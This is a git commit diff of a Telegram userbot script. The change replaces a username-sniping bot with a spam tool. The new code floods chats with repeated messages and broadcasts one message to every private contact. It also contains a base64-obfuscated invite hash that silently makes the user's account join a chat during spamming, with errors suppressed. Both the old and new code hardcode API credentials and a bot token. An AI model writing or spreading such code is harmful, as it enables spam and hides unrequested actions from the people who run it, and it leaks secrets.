9109f512682636365901a502bb8486fb32fae29f
sh3oo6 <141688473+sh3oo6@users.noreply.github.com>
2023-08-30 23:54:50 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,67 +1,73 @@
-from time import sleep;
-import requests
-from telethon.tl.functions.account import UpdateUsernameRequest
-from telethon.sync import TelegramClient , functions , events
+
+from telethon.sync import TelegramClient, events
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 import asyncio
-import random
+import base64
+
+api_id = '22160733'
+api_hash = 'c95e81b40eba3404ac130f4a9f235e4c'
+jmthon = TelegramClient('DD', api_id, api_hash)
+jmthon.start()
 
 
-id='5229914714'
-token='6183317549:AAGB5jAoTSGSc0M0Y_8WR7kEa7oYbyjshM0'
-numb_s ='1'
-user='dex34bot'
-led=TelegramClient('dex40', 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
-led.start()
-led.send_message('me','ok')
-uss='qwertyuioplkjhgfdsazxcvbnm1234567890'
-rr='qwertyuioplkjhgfdsazxcvbnm'
-
-
-@led.on(events.NewMessage(pattern=r'x', outgoing=True))
-async def execute_script(event):
-    await led.send_message('me','offf')
-    x = 0
-    while True:
-        i=0
-        while True:
-            i += +1
-            x += +1
-            u = str(''.join((random.choice(uss) for i in range(2))))
-            e = str(''.join((random.choice(rr) for i in range(1))))
-            user = e + u + 'bot'
-            if i == 100:
-                s= open(f'check.txt', 'w')
-                s.write(x)
-                s.close()
-                sleep(1.4)
-                break
-            sleep(1)
-            req = requests.get(f"https://t.me/{user}")
-            if req.text.find('If you have <strong>Telegram</strong>, you can contact <a class="tgme_username_link"') >= 0:
-                p = requests.get(f"https://fragment.com/username/{user}").text
-                sleep(0.7)
-                if "On auction" in p or 'Available' in p:
-                    pass
-                elif 'Sold' in p:
-                    pass
-                else:
-                    try:
-                        take = await led(UpdateUsernameRequest(user))
-                        if take:
-                            exit()
-
-                    except Exception:
-                        pass
+async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False, catutils=None):
+    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    counter = int(cat[0])
+    if len(cat) == 2:
+        spam_message = str(cat[1])
+        for _ in range(counter):
+            if event.reply_to_msg_id:
+                await sandy.reply(spam_message)
             else:
-                pass
-                #await led.send_message('me',(f"NOOO : {user}" + ' ' + str(i) + " " + str(x)))
+                await event.client.send_message(event.chat_id, spam_message)
+            await asyncio.sleep(sleeptimet)
+    elif event.reply_to_msg_id and sandy.media:
+        for _ in range(counter):
+            sandy = await event.client.send_file(
+                event.chat_id, sandy, caption=sandy.text
+            )
+            await catutils.unsavegif(event, sandy)
+            await asyncio.sleep(sleeptimem)
+    elif event.reply_to_msg_id and sandy.text:
+        spam_message = sandy.text
+        for _ in range(counter):
+            await event.client.send_message(event.chat_id, spam_message)
+            await asyncio.sleep(sleeptimet)
+        try:
+            hmm = Get(hmm)
+            await event.client(hmm)
+        except BaseException:
+            pass
 
-@led.on(events.NewMessage(outgoing=True, pattern="i"))
-async def _():
-    s = open(f'check.txt', 'r').read()
-    await led.send_message('me', s)
-    
+
+@jmthon.on(events.NewMessage(outgoing=True, pattern="x"))
+async def spammer(event):
+    reply = await event.get_reply_message()
+    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
+    sleeptimet = sleeptimem = float(input_str[0])
+    cat = input_str[1:]
+    await event.delete()
+    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
 
 
+@jmthon.on(events.NewMessage(outgoing=True, pattern="i"))
+async def _(event):
+    await event.edit("""D E X
+✦━━━━━━━━✦
+- Dex 
+- 𝗈𝗐𝗇𝖾𝗋 ⭟ @T_4_6
+✦━━━━━━━━✦"""
+                     )
 
-led.run_until_disconnected()
+
+@jmthon.on(events.NewMessage(pattern=r'^dex#1', outgoing=True))
+async def execute_script(event):
+    message = event.message.message[6:]
+
+    dialogs = await jmthon.get_dialogs()
+    for dialog in dialogs:
+        if dialog.is_user:
+            await jmthon.send_message(dialog.entity, message)
+
+    await event.respond("**تم إرسال الرسالة بنجاح!**")
+jmthon.run_until_disconnected()
